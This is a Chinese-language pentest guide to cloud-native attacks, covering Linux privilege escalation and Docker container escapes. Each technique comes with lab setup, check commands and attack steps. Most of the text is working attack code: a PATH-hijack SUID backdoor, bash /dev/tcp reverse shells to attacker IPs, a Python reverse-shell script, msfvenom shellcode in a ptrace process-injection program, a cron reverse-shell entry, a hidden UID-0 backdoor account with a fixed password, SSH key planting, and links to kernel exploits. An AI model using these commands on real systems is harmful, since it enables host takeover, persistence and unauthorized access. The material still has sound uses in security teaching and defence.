# Cloud Attack Surface - 云原生攻击面

## Linux Local Privilege Escalation - Linux本地提权

### PATH PE - 环境变量提权

#### 环境搭建

```shell
echo 'PATH="/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin"' > /etc/environment
```

#### 利用条件

- 使用linpeas.sh查看是否存在当前用户可写的环境变量目录

![pri](../images/Cloud/path-info-1.png)

#### 攻击方法

- 创建一个后门，后门名称可以为linux常用命令

```shell
nano ps.c
```

- 编写后门代码

```c
#include<stdlib.h>
void main()
{
	system("cp /bin/bash /tmp/shell;chmod u+s /tmp/shell;/usr/bin/ps");
}
```

- 编译c文件

```shell
gcc ps.c -o ps
```

- 等待root用户执行ps命令，即可获取suid shell

```shell
./shell -p
```

![pri](../images/Cloud/path-att-1.png)

### Docker Group PE - Docker用户组提权

#### 环境搭建

```shell
adduser guest;usermod -G docker guest;newgrp docker
```

#### 利用条件

```shell
id|grep docker
```

![pri](../images/Cloud/docker-group-info-1.png)

#### 攻击方法

- 挂载宿主机根目录

```shell
docker run --rm -it -h docker-group-pe -v /:/host/ nginx /bin/bash
```

![pri](../images/Cloud/docker-group-att-1.png)

- 获取宿主机权限请看Container Mount GetShell一节

## Container Escape - 容器逃逸

### Insecure Configuration - 不安全的配置

#### Privileged特权容器逃逸

##### 环境搭建

```shell
docker run --rm --privileged -it -h privileged-escape -v /root/cdk:/cdk ubuntu bash
```

##### 利用条件

```shell
cat /proc/self/status | grep -qi "0000003fffffffff" && echo "Is privileged mode" || echo "Not privileged mode"
```

![pri](../images/Cloud/pri-info-1.png)

##### 攻击方法

###### 挂载Disk逃逸

- 挂载磁盘

```shell
./cdk run mount-disk
```

![pri](../images/Cloud/pri-mount-att-1.png)

- 获取宿主机权限请看Container Mount GetShell一节

###### 挂载Cgroup目录逃逸

```shell
./cdk run mount-cgroup "hostname"
```

![pri](../images/Cloud/pri-mount-att-2.png)

#### Socket挂载逃逸

##### 环境搭建

```shell
docker run --rm -it -h sock-escape -v /root/cdk:/cdk -v /var/run/docker.sock:/var/run/docker.sock ubuntu bash
```

##### 利用条件

- 查看是否存在docker.sock文件

```shell
./cdk run docker-sock-check /var/run/docker.sock
```

![sock](../images/Cloud/sock-info-1.png)

##### 攻击方法

- 安装docker命令行

```shell
apt update;apt install -y curl;curl -fsSL https://get.docker.com/|sh
```

- 把宿主机目录挂载到新容器

```shell
docker run --rm -it -h sock-to-host -v /:/host ubuntu bash
```

- 将根目录切换到宿主机目录

```shell
chroot /host cat /etc/hostname
```

![sock](../images/Cloud/sock-att-1.png)

#### Procfs目录挂载逃逸

##### 环境搭建

```shell
docker run --rm -it -h procfs-escape -v /root/cdk:/cdk -v /proc:/host/proc ubuntu bash
```

##### 利用条件

```shell
find / -name core_pattern 2>/dev/null | wc -l | grep -q 2 && echo "Procfs is mounted." || echo "Procfs is not mounted."
```

![proc](../images/Cloud/proc-info-1.png)

##### 攻击方法

###### CDK反弹shell

```shell
./cdk run mount-procfs /host/proc "/bin/bash -i>& /dev/tcp/172.17.0.4/4444 0>&1"
```

![proc](../images/Cloud/proc-att-1.png)

###### PWN反弹shell

- 查找容器在宿主机的真实路径，根据下图所示，可判断容器路径为/var/lib/docker/overlay2/c7bb8b127b0a62000202ce285c8871cb57faf0997401bdb588fdb684ee6f2c71/merged

```shell
cat /proc/mounts | xargs -d ',' -n 1 | grep workdir
```

![proc](../images/Cloud/proc-att-2.png)

- 编写一个反弹shell的脚本，反弹到容器，或攻击机

```python3
#!/usr/bin/python3
import  os
import pty
import socket
lhost = "172.17.0.2"
lport = 4444
def main():
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.connect((lhost, lport))
   os.dup2(s.fileno(), 0)
   os.dup2(s.fileno(), 1)
   os.dup2(s.fileno(), 2)
   os.putenv("HISTFILE", '/dev/null')
   pty.spawn("/bin/bash")
   s.close()
if __name__ == "__main__":
   main()
```

![proc](../images/Cloud/proc-att-3.png)

- 把脚本所在路径写入到proc

```shell
echo -e "|/var/lib/docker/overlay2/c7bb8b127b0a62000202ce285c8871cb57faf0997401bdb588fdb684ee6f2c71/merged/shell.py" > /host/proc/sys/kernel/core_pattern
```

![proc](../images/Cloud/proc-att-4.png)

- 创建一个可崩溃的程序break.c，编译并执行

```shell
#include<stdio.h>
int main(void)  {
   int *a  = NULL;
   *a = 1;
   return 0;
}
```

![proc](../images/Cloud/proc-att-5.png)

- 给py脚本赋予执行权限，开启监听，反弹宿主机shell

```shell
chmod +x shell.py
```

![proc](../images/Cloud/proc-att-6.png)

#### 挂载宿主机根目录逃逸

##### 环境搭建

```shell
docker run --rm -it -h mount-root-escape -v /root/cdk:/cdk -v /:/host/ ubuntu bash
```

##### 利用条件

```
find / -name passwd 2>/dev/null | grep -v diff | grep /etc/passwd | wc -l | grep -q 2 && echo "Root directory is mounted." || echo "Root directory is not mounted."
```

![proc](../images/Cloud/root-info-1.png)

##### 攻击方法

- 获取宿主机权限请看Container Mount GetShell一节

#### Docker API 2375未授权访问

##### 环境搭建

```shell
# 配置docker api远程未授权访问
dockerd -H unix:///var/run/docker.sock -H 0.0.0.0:2375
# 部署环境
docker run --rm -it -h unauth-api-escape -v /root/cdk:/cdk ubuntu bash
```

##### 利用条件

```shell
IP=`hostname -i | awk -F. '{print $1 "." $2 "." $3 ".1"}' ` && timeout 3 bash -c "echo >/dev/tcp/$IP/2375" > /dev/null 2>&1 && echo "Docker Remote API Is Enabled." || echo "Docker Remote API is Closed."
```

![proc](../images/Cloud/unauth-info-1.png)

##### 攻击方法

- 把宿主机根目录挂载到新的容器

```shell
docker -H tcp://172.17.0.1:2375 run --rm -it -h host-getshell -v /:/host nginx bash
```

![proc](../images/Cloud/unauth-att-1.png)

- 获取宿主机权限请看Container Mount GetShell一节

#### lxcfs cgroup逃逸

##### 环境搭建

```shell
# 下载lxcfs
wget --no-check-certificate https://copr-be.cloud.fedoraproject.org/results/ganto/lxc3/epel-7-x86_64/01041891-lxcfs/lxcfs-3.1.2-0.2.el7.x86_64.rpm
# 安装lxcfs
yum install -y --skip-broken lxcfs-3.1.2-0.2.el7.x86_64.rpm
# 启动lxcfs
lxcfs /var/lib/lxcfs
# 启动容器环境
docker run --rm -it -h lxcfs-escape -v /root/cdk:/cdk -v /var/lib/lxcfs:/lxcfs:rw ubuntu bash
```

##### 攻击方法

- 获取宿主机读写权限

```shell
./cdk run lxcfs-rw
```

![lxcfs](../images/Cloud/lxcfs-att-1.png)

- 进入cgroup的debug模式

```shell
debugfs -w host_dev
```

![lxcfs](../images/Cloud/lxcfs-att-2.png)

- 获取宿主机权限请看Container Mount GetShell一节

#### 重写Cgroup逃逸

##### 环境搭建

```shell
docker run --rm -it -h cgroup-escape -v /root/cdk:/cdk --cap-add="SYS_ADMIN" ubuntu bash
```

##### 攻击方法

- 获取宿主机读写权限

```shell
./cdk run rewrite-cgroup-devices
```

![lxcfs](../images/Cloud/cgroup-att-1.png)

- 进入cgroup的debug模式

```shell
debugfs -w cdk_mknod_result
```

![lxcfs](../images/Cloud/cgroup-att-2.png)

- 进行写文件提权操作，参考挂载逃逸，略

#### Ptrace逃逸

##### 环境搭建

```shell
docker run --rm -it -h ptrace-escape -v /root/cdk:/cdk --pid=host --cap-add=SYS_PTRACE ubuntu bash
```

##### 利用条件

```shell
./cdk run check-ptrace
```

![proc](../images/Cloud/ptrace-info-1.png)

##### 攻击方法

- 使用msf生成反弹shell的shellcode

```shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=172.17.0.4 LPORT=4444 -f c
```

![proc](../images/Cloud/ptrace-att-1.png)

- 编写进程注入代码infect.c，把shellcode注入到内存（PS：注意替换下面代码的SHELLCODE_SIZE和shellcode）

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sys/user.h>
#include <sys/reg.h>

#define SHELLCODE_SIZE 74

unsigned char *shellcode = 
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97"
"\x48\xb9\x02\x00\x11\x5c\xac\x11\x00\x04\x51\x48\x89\xe6"
"\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce"
"\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f"
"\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48"
"\x89\xe6\x0f\x05";

int inject_data(pid_t pid, unsigned char *src, void *dst, int len) {
  int i;
  uint32_t *s = (uint32_t *)src;
  uint32_t *d = (uint32_t *)dst;

  for (i = 0; i < len; i += 4, s++, d++) {
    if (ptrace(PTRACE_POKETEXT, pid, d, *s) < 0) {
      perror("ptrace(POKETEXT):");
      return -1;
    }
  }
  return 0;
}

int main(int argc, char *argv[]) {
  pid_t target;
  struct user_regs_struct regs;
  int syscall;
  long dst;

  if (argc != 2) {
    fprintf(stderr, "Usage:\n\t%s pid\n", argv[0]);
    exit(1);
  }
  target = atoi(argv[1]);
  printf("+ Tracing process %d\n", target);

  if (ptrace(PTRACE_ATTACH, target, NULL, NULL) < 0) {
    perror("ptrace(ATTACH):");
    exit(1);
  }

  printf("+ Waiting for process...\n");
  wait(NULL);

  printf("+ Getting Registers\n");
  if (ptrace(PTRACE_GETREGS, target, NULL, &regs) < 0) {
    perror("ptrace(GETREGS):");
    exit(1);
  }

  printf("+ Injecting shell code at %p\n", (void *)regs.rip);
  inject_data(target, shellcode, (void *)regs.rip, SHELLCODE_SIZE);

  regs.rip += 2;
  printf("+ Setting instruction pointer to %p\n", (void *)regs.rip);

  if (ptrace(PTRACE_SETREGS, target, NULL, &regs) < 0) {
    perror("ptrace(GETREGS):");
    exit(1);
  }
  printf("+ Run it!\n");

  if (ptrace(PTRACE_DETACH, target, NULL, NULL) < 0) {
    perror("ptrace(DETACH):");
    exit(1);
  }
  return 0;
}
```

- 编译infect.c，并执行infect反弹宿主机shell

```shell
gcc infect.c -o infect
```

![proc](../images/Cloud/ptrace-att-2.png)

#### Container Mount GetShell - 挂载逃逸GetShell指南

##### Crontab GetShell - 写计划任务反弹shell

- 查看容器IP

```shell
./cdk ifconfig
```

![pri](../images/Cloud/cron-att-1.png)

- 写入计划任务，把宿主机的shell反弹到容器

```shell
echo "* * * * * /bin/bash -i >& /dev/tcp/172.17.0.2/4444 0>&1" >> /tmp/cdk_HDsqT/var/spool/cron/root
```

![pri](../images/Cloud/cron-att-2.png)

- 容器开启nc监听

```shell
./cdk nc -l -v -p 4444
```

![pri](../images/Cloud/cron-att-3.png)

##### BackDoor User - 创建后门账号

- 把创建后门账号脚本写到挂载目录下

```shell
echo 'useradd -ou 0 -g 0 hack;echo -e "1qaz@WSX8888\n1qaz@WSX8888\n" |passwd hack' > /tmp/cdk_HDsqT/add.sh
```

![pri](../images/Cloud/backdoor-user-att-1.png)

- 运行创建后门账号脚本

```shell
chroot /tmp/cdk_HDsqT bash add.sh
```

![pri](../images/Cloud/backdoor-user-att-2.png)

- ssh远程连接宿主机

```shell
ssh hack@172.17.0.1 -p 27845
```

![pri](../images/Cloud/backdoor-user-att-3.png)

##### SSH PubKey - 写SSH公钥

- 生成ssh公钥

```shell
ssh-keygen -t ecdsa
```

![pri](../images/Cloud/ssh-pub-att-1.png)

- 把公钥写到宿主机的ssh目录

```shell
cat /root/.ssh/id_ecdsa.pub >> /tmp/cdk_HDsqT/root/.ssh/authorized_keys
```

![pri](../images/Cloud/ssh-pub-att-2.png)

- 使用公钥远程连接宿主机

```shell
ssh -i /root/.ssh/id_ecdsa root@172.17.0.1 -p 27845
```

![pri](../images/Cloud/ssh-pub-att-2.png)

- 写ssh公钥

```shell
ssh -i /root/.ssh/id_ecdsa root@172.17.0.1 -p 27845
```

![pri](../images/Cloud/ssh-pub-att-3.png)

### Docker Vulnerability - 容器漏洞

|     漏洞编号     |                           Exploit                            |
| :--------------: | :----------------------------------------------------------: |
| cve-2017-1002101 |                                                              |
| cve-2018-1002100 |                                                              |
|  cve-2018-15664  |                                                              |
|  cve-2019-14271  |                                                              |
| cve-2019-1002101 |                                                              |
|  cve-2019-11246  |                                                              |
|  cve-2019-11249  |                                                              |
|  cve-2019-11251  |                                                              |
|  cve-2019-16884  | https://wiki.teamssix.com/CloudNative/Docker/CVE-2019-16884.html |
|  cve-2019-5736   |       https://github.com/cdk-team/CDK/wiki/CDK-Home-CN       |
|  cve-2020-15257  |       https://github.com/cdk-team/CDK/wiki/CDK-Home-CN       |
|  cve-2020-27151  |                                                              |
| kata-escape-2020 |                                                              |
|  cve-2021-25741  |                                                              |
|  cve-2021-30465  |                                                              |
|  cve-2022-0492   | https://wiki.teamssix.com/CloudNative/Docker/CVE-2022-0492.html |

### Kernel Privilege Escalation - 内核提权

|     漏洞编号     |                            Exploi                            |
| :--------------: | :----------------------------------------------------------: |
|  CVE-2016-5195   |          https://github.com/gbonacini/CVE-2016-5195          |
| cve-2017-1000112 |                                                              |
|  cve-2020-14386  |                                                              |
|  CVE-2021-22555  |      https://github.com/xyjl-ly/CVE-2021-22555-Exploit       |
|  CVE-2022-0847   | https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits、https://wiki.teamssix.com/CloudNative/Docker/CVE-2022-0847-dirty-pipe.html |
|  CVE-2021-3493   |         https://github.com/inspiringz/CVE-2021-3493          |
|  CVE-2022-23222  |         https://github.com/tr3ee/CVE-2022-23222.git          |

